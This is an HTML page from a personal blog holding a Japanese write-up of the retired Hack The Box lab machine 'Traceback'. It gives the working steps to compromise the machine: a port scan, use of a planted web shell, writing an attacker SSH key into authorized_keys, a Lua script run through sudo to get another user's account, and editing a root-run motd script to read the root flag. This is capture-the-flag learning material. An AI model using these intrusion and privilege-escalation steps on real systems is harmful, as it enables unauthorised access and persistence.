@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>λ沢.dev</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://www.lambdasawa.dev/style.css">
+    <link rel="stylesheet" href="https://www.lambdasawa.dev/color/orange.css">
+
+        <link rel="stylesheet" href="https://www.lambdasawa.dev/color/background_blue.css">
+    
+    <link rel="stylesheet" href="https://www.lambdasawa.dev/font-hack-subset.css">
+
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://www.lambdasawa.dev" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            λ沢.dev
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://github.com/lambdasawa" target="_blank" rel="noopener noreferrer">GitHub</a></li>
+            
+                <li><a href="https://zenn.dev/lambdasawa" target="_blank" rel="noopener noreferrer">Zenn</a></li>
+            
+                <li><a href="https://twitter.com/lambdasawa" target="_blank" rel="noopener noreferrer">Twitter</a></li>
+            
+                <li><a href="https://www.wantedly.com/id/lambdasawa" target="_blank" rel="noopener noreferrer">Wantedly</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://www.lambdasawa.dev/blog/hack-the-box-traceback/"></a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date"></span>
+
+    </div>
+
+    
+
+        
+        <div class="post-content">
+            <p>最近 <a href="https://app.hackthebox.eu/login">Hack The Box</a> というものにハマっています。
+これはざっくり説明するとペネトレーションテストの実力を試せる Web サイトです。
+サービス側から <code>.ovpn</code> ファイルとその VPN 上にある脆弱なマシンの IP アドレスが提供されるので、そこにポートスキャンしたり SQL インジェクションしたりして root 権限を奪取するというものです。</p>
+<p>マシンは複数台あり、 Active なマシンを攻略するとレートが付きます。ほぼネトゲです。
+各マシンは 20 週間位で Retire してレートがつかなくなります。
+1 週間ごとに一番古いマシンが 1 つリタイアして 1 つアクティブなマシンが追加されるようになっていて、 Active なマシンが大体 20 個あるので 20 週間くらいです。
+Retire したマシンのみ write up を書いて良いということになっています。</p>
+<p>Challenge というクイズ的な問題もあるのですが、これは自分はやったことが無いので特に触れません。</p>
+<p>自分は HTB を初めて日が浅いのですが初めて解いた問題がリタイアしたので記念と自慢として write up を残します。</p>
+<h2 id="write-up">write up</h2>
+<p><a href="https://app.hackthebox.eu/machines/233">Traceback</a> を解きました。
+Linux マシンです。難易度は Easy です。</p>
+<h3 id="potosukiyan">ポートスキャン</h3>
+<p>まずどんなサービスが動いているか確認します。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ nmap -A 10.10.10.181
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 03:20 EDT
+</span><span>Nmap scan report for 10.10.10.181
+</span><span>Host is up (0.17s latency).
+</span><span>Not shown: 998 closed ports
+</span><span>PORT   STATE SERVICE VERSION
+</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span>| ssh-hostkey:
+</span><span>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+</span><span>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+</span><span>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+</span><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span>|_http-title: Help us
+</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 29.72 seconds
+</span></code></pre>
+<p><code>ssh</code>, <code>http</code> が出来そうです。</p>
+<h3 id="foothold">foothold</h3>
+<p><code>curl</code> で HTML を見てみると以下のような記述があります。</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">body</span><span>&gt;
+</span><span>        &lt;</span><span style="color:#bf616a;">center</span><span>&gt;
+</span><span>                &lt;</span><span style="color:#bf616a;">h1</span><span>&gt;This site has been owned&lt;/</span><span style="color:#bf616a;">h1</span><span>&gt;
+</span><span>                &lt;</span><span style="color:#bf616a;">h2</span><span>&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/</span><span style="color:#bf616a;">h2</span><span>&gt;
+</span><span>                &lt;</span><span style="color:#bf616a;">h3</span><span>&gt; - Xh4H - &lt;/</span><span style="color:#bf616a;">h3</span><span>&gt;
+</span><span>                </span><span style="color:#65737e;">&lt;!--Some of the best web shells that you might need ;)--&gt;
+</span><span>        &lt;/</span><span style="color:#bf616a;">center</span><span>&gt;
+</span><span>&lt;/</span><span style="color:#bf616a;">body</span><span>&gt;
+</span></code></pre>
+<p><code>best web shells</code> がバックドアとして残されているようです。
+「<code>best</code> なんて人によるだろ」と思い作問者の名前 (<code>xh4h</code>) + <code>web shell</code> でググると <a href="https://twitter.com/riftwhitehat/status/1237311680276647936">https://twitter.com/riftwhitehat/status/1237311680276647936</a> が見つかります。
+このリポジトリをクローンしてきて雑に <code>for path in (ls | grep -v README); curl 10.10.10.181/$path; echo $path; end</code> とかすると <code>smevk.php</code> が見つかります。
+<code>smevk.php</code> のデフォルトユーザ名、パスワードでログイン出来るのでこれで任意コード実行が出来るようになりました。</p>
+<h3 id="user-login">user login</h3>
+<p><code>smevk.php</code> で <code>user.txt</code> を入手したいですが、ログイン中のユーザではそれが無いです。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ls -al /home/$(whoami)
+</span><span>total 44
+</span><span>drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
+</span><span>drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
+</span><span>-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
+</span><span>-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
+</span><span>-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
+</span><span>drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
+</span><span>drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
+</span><span>-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
+</span><span>-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
+</span><span>drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
+</span><span>-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
+</span></code></pre>
+<p><code>smevk.php</code> のコンソールは使いにくいしユーザ名も分かったし、 <code>ssh</code> 接続を試みます。</p>
+<p>ますクライアントマシンでキーペア生成します。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh-keygen -f ~/.ssh/traceback
+</span></code></pre>
+<p><code>smevk.php</code> のコンソールからこんな感じで生成した <code>~/.ssh/traceback.pub</code> をアップロードします。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>mkdir -p /home/webadmin/.ssh/ &amp;&amp; echo &quot;ssh-rsa xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxx&quot; &gt; /home/webadmin/.ssh/authorized_keys &amp;&amp; cat /home/webadmin/.ssh/authorized_keys
+</span></code></pre>
+<p>これで SSH すると無事に安定したシェルを得られます。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh -i ~/.ssh/traceback webadmin@10.10.10.181
+</span><span>#################################
+</span><span>-------- OWNED BY XH4H  ---------
+</span><span>- I guess stuff could have been configured better ^^ -
+</span><span>#################################
+</span><span>
+</span><span>Welcome to Xh4H land
+</span><span>
+</span><span>
+</span><span>
+</span><span>Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
+</span><span>webadmin@traceback:~$
+</span></code></pre>
+<p>先程の <code>ls</code> の結果を見つめ直すと <code>note.txt</code>, <code>.luvit_history</code> の興味深いファイルが見つかります。
+前者の内容は以下です。後者は空でした。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ cat /home/webadmin/note.txt
+</span><span>- sysadmin -
+</span><span>I have left a tool to practice Lua.
+</span><span>I&#39;m sure you know where to find it.
+</span><span>Contact me if you have any question.
+</span></code></pre>
+<p>Lua の練習ツールを <code>sysadmin</code> が残してくれたらしいです。</p>
+<p>続いてホームディレクトリ内のファイルを順番に見ていると以下のような興味深い履歴が見つかります。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ cat /home/webadmin/.bash_history
+</span><span>ls -la
+</span><span>sudo -l
+</span><span>nano privesc.lua
+</span><span>sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+</span><span>rm privesc.lua
+</span><span>logout
+</span></code></pre>
+<p>どうやら <code>luvit</code> で権限昇格が出来るようです。
+<a href="https://luvit.io/"><code>luvit</code></a> は Node.js の API を使える Lua の処理系らしいです。
+これを使って <code>sysadmin</code> に <code>ssh</code> 出来るように <code>/home/sysadmin/.ssh/authorized_keys</code> の作成を試みます。</p>
+<p>以下のコードを <code>/home/webadmin/privesc.lua</code> として書きます。キーの内容はクライアントマシンの <code>~/.ssh/traceback.pub</code> です。</p>
+<pre data-lang="lua" style="background-color:#2b303b;color:#c0c5ce;" class="language-lua "><code class="language-lua" data-lang="lua"><span style="color:#b48ead;">local </span><span style="color:#bf616a;">fs </span><span>= </span><span style="color:#96b5b4;">require</span><span>(&#39;</span><span style="color:#a3be8c;">fs</span><span>&#39;)
+</span><span>
+</span><span style="color:#bf616a;">fs</span><span>.</span><span style="color:#bf616a;">mkdirSync</span><span>(&#39;</span><span style="color:#a3be8c;">/home/sysadmin/.ssh</span><span>&#39;)
+</span><span>
+</span><span style="color:#b48ead;">local </span><span style="color:#bf616a;">pubkey </span><span>= &#39;</span><span style="color:#a3be8c;">ssh-rsa xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxx</span><span>&#39;
+</span><span style="color:#bf616a;">fs</span><span>.</span><span style="color:#bf616a;">writeFileSync</span><span>(&#39;</span><span style="color:#a3be8c;">/home/sysadmin/.ssh/authorized_keys</span><span>&#39;, </span><span style="color:#bf616a;">pubkey</span><span>)
+</span></code></pre>
+<p>これを <code>.bash_history</code> に従って以下のように実行すると無事に正常終了します。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+</span></code></pre>
+<p>これで <code>sysadmin</code> に <code>ssh</code> 出来るようになって <code>user.txt</code> が取れました！</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
+</span><span>#################################
+</span><span>-------- OWNED BY XH4H  ---------
+</span><span>- I guess stuff could have been configured better ^^ -
+</span><span>#################################
+</span><span>
+</span><span>Welcome to Xh4H land
+</span><span>
+</span><span>
+</span><span>
+</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span><span>
+</span><span>Last login: Fri Aug 21 00:47:10 2020 from 10.10.14.11
+</span><span>$ bash
+</span><span>sysadmin@traceback:~$ cat user.txt
+</span><span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span></code></pre>
+<h3 id="root-login">root login</h3>
+<p>まず <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"><code>linPEAS</code></a> を流します。</p>
+<p>クライアントマシンでダウンロード、 scp でターゲットマシンに送りつけます。
+ターゲットマシンで <code>curl</code> or <code>wget</code> が使えれば楽なのですが、 名前解決で失敗していたのでこうしています。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+</span><span>$ chmod u+x linpeas.sh
+</span><span>$ scp -i ~/.ssh/traceback linpeas.sh sysadmin@10.10.10.181:/home/sysadmin/linpeas.sh
+</span></code></pre>
+<p>実行すると以下の辺りが黄色くなっています。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sysadmin@traceback:~$ ./linpeas.sh
+</span><span>
+</span><span>... 省略 ...
+</span><span>
+</span><span>[+] Interesting GROUP writable files (not in Home) (max 500)
+</span><span>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+</span><span>  Group sysadmin:
+</span><span>/etc/update-motd.d/50-motd-news
+</span><span>/etc/update-motd.d/10-help-text
+</span><span>/etc/update-motd.d/91-release-upgrade
+</span><span>/etc/update-motd.d/00-header
+</span><span>/etc/update-motd.d/80-esm
+</span><span>/home/webadmin/note.txt
+</span><span>/dev/mqueue/linpeas.txt
+</span><span>
+</span><span>... 省略 ...
+</span></code></pre>
+<p><code>/etc/upated-motd.d</code> 以下はログイン時に出るバナーなどを実装しているシェルスクリプトのようです。
+root 権限で動作するらしいので、ここで <code>/root/root.xt</code> の表示を試みます。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ nano /etc/update-motd.d/00-header
+</span><span>
+</span><span># cat /root/root.txt を追加
+</span></code></pre>
+<p>これで SSH し直すとバナーと一緒に <code>root.txt</code> も出力されます！</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
+</span><span>#################################
+</span><span>-------- OWNED BY XH4H  ---------
+</span><span>- I guess stuff could have been configured better ^^ -
+</span><span>#################################
+</span><span>
+</span><span>Welcome to Xh4H land
+</span><span>
+</span><span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</span><span>
+</span><span>
+</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span><span>
+</span><span>Last login: Fri Aug 21 00:56:10 2020 from 10.10.14.11
+</span><span>$
+</span></code></pre>
+<h2 id="gan-xiang">感想</h2>
+<p>最初から Web Shell がしかけられてるシチュエーションなんてあるかよ、という気持ちもあったのですがイタズラ的にマシンを乗っ取られてそれを取り返すというシチュエーションだと思うと、ある程度は納得出来る問題でした。</p>
+<p>初めての問題で何も分からない状態からのスタートでしたが、リタイアした別マシンの write up を読んで使うべきツールなり定石なりを把握すると割とすんなり解けました。
+実際仕事終わりに問題に取り組んで 2 日間くらいかかってしまったのですが、終わってみると「やるだけ」だったなという感想です。</p>
+<p>そもそも始めたきっかけは <a href="https://speakerdeck.com/sanposhiho/hatukingutoiuyan-xie-nichong-reruenziniada-nizeng-ru-hack-the-box-ru-men">ハッキングという言葉に憧れるエンジニア達に贈る Hack the Box 入門</a> を見たことなのですが、
+これを最初に見たとき「これが Easy なら自分には厳しいな」という印象を持ったのですが、やってみれば割とこなせたので少し自分に自信がつきました。
+良い経験だったと思います。</p>
+<p>今の自分は Script Kiddie という大変不名誉なランクなので Hacker になるまでは続けようと思います。</p>
+<p>https://app.hackthebox.eu/profile/367637</p>
+
+        </div>
+
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2023
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
